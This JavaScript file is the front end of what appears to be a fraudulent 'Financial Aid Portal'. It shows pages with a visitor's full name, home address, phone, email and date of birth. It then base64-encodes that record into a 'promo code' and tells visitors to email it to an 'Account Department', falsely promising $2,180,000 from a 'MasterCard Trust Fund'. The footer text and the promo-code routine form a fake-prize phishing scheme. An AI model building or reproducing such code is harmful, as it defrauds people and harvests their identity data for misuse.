// 
// batchNumber("CA-783848")
function batchNumber(num) {
    // 
    let navPage = `
        <ul id="nav">
            <section id="nav_list">
                <a href="./"><img src="./pics/logo.png" alt="944"></a>
            </section>

            <a id="benefit_nav_link" href="./?page=beneficiary">Login</a>
        </ul>
    `
    let footPage = `
        <p>
            Forward your promo code to the <a href="mailto:${contactMail}" style="color: rgb(2, 109, 197); text-decoration:none; font-weight:bold;">Account Department</a>, via: <a href="mailto:${contactMail}" style="color: rgb(2, 109, 197); text-decoration:none; font-weight:bold;">${contactMail}</a> to complete registration. Three (3) selected beneficiaries will each receive two million, one hundred eighty thousand dollars ($2,180,000 USD) as part of our <b>MasterCard Trust Fund</b> initiative.
        </p>
    `

     let updatePage = `
        ${navPage}

            <main id="main">
                <section id="batch_container">
                    <h2>Invalid Batch Number !</h2>

                    <img src="./pics/batch.gif" id="batch2_img" alt="7693">

                </section>
            </main>

            <footer id="footer">${footer}</footer>
    `;

    // 
    $("#preloading").fadeIn("fast", ()=>{
        //
        let batchList = "";

        if (num == "success") {
            // registration complete
            let batchJson = JSON.parse(localStorage.getItem("batch_number"))

            updatePage = `
            ${navPage}

            <main id="main">
                <section id="batch_container">
                    <h2>Your batch number has been generated.</h2>

                    <img src="./pics/batch2.gif" id="batch2_img" alt="8493">

                    <ul id="batch_list_contents">
                        <h3>Details (${batchJson.id}):</h3>

                        <li>
                            <b>Full Name:</b>
                            <span style="text-transform: capitalize">${batchJson.firstName} ${batchJson.middleName} ${batchJson.lastName}</span>
                        </li>
                        <li>
                            <b>Batch Number:</b>
                            <span style="text-transform: uppercase">${batchJson.id}</span>
                        </li>
                        <li>
                            <b>Selected Category:</b>
                            <span>${batchJson.category}</span>
                        </li>
                        <li>
                            <b>Home Address:</b>
                            <span>${batchJson.homeAddress}</span>
                        </li>
                        <li>
                            <b>Phone Number:</b>
                            <span>${batchJson.phoneNumber}</span>
                        </li>
                        <li>
                            <b>E-mail Address:</b>
                            <span style="text-transform: lowercase">${batchJson.email}</span>
                        </li>
                        <li>
                            <b>Date of Birth:</b>
                            <span><span>${batchJson.dateBirth}</span></span>
                        </li>
                        <li>
                            <b>Promo Code:</b>
                            <span id="copy_code">
                                <i class="get_code_txt">${btoa(localStorage.getItem("batch_number"))}</i>
                                <button onclick="copyPaste(this)">Copy</button>
                            </span>
                        </li>
                    </ul>

                    <div id="batch_foot">
                        <h3>Important:</h3>
                        ${footPage}
                        <p>
                            <b>Note:</b> <span>This code will expire in 3 days.</span>
                        </p>
                    </div>
                </section>
            </main>

            <footer id="footer">${footer}</footer>
            `
        } 
        else {
            // search for batch
            $.get('./json/users.json', (res)=>{
                // console.log(res)
                for (let i = 0; i < res.length; i++) {
                    
                    if (res[i].id == num) {
                        updatePage = `
                            ${navPage}

                            <main id="main">
                                <section id="batch_container">
                                    <h2>Financial Aid Portal</h2>

                                    <img src="./pics/batch2.gif" id="batch2_img" alt="8493">

                                    <ul id="batch_list_contents">
                                        <h3>Details (${res[i].id}):</h3>

                                        <li>
                                            <b>Full Name:</b>
                                            <span>${res[i].firstName} ${res[i].middleName} ${res[i].lastName}</span>
                                        </li>
                                        <li>
                                            <b>Batch Number:</b>
                                            <span>${res[i].id}</span>
                                        </li>
                                        <li>
                                            <b>Selected Category:</b>
                                            <span>${res[i].category}</span>
                                        </li>
                                        <li>
                                            <b>Home Address:</b>
                                            <span>${res[i].homeAddress}</span>
                                        </li>
                                        <li>
                                            <b>Phone Number:</b>
                                            <span>${res[i].phoneNumber}</span>
                                        </li>
                                        <li>
                                            <b>E-mail Address:</b>
                                            <span>${res[i].email}</span>
                                        </li>
                                        <li>
                                            <b>Date of Birth:</b>
                                            <span><span>${res[i].dateBirth}</span></span>
                                        </li>
                                    </ul>
                                    <br>
                                </section>
                            </main>

                            <footer id="footer">${footer}</footer>
                        `

                        $("body").html(updatePage)
                        return
                    }
                    
                }
                  
            })   
        }
        
        $("body").html(updatePage).scrollIntoView()

    }).fadeOut("slow")
}

// 
function copyPaste(txt) {
    // 
    let x = txt.parentElement
    let p = x.getElementsByClassName("get_code_txt")[0]

   // Copy the text inside the text field
  navigator.clipboard.writeText(p.innerText);

  // Alert the copied text
  txt.innerText = "Copied !"

  setTimeout(() => {
    txt.innerText = "Copy"
  }, 5000);
}
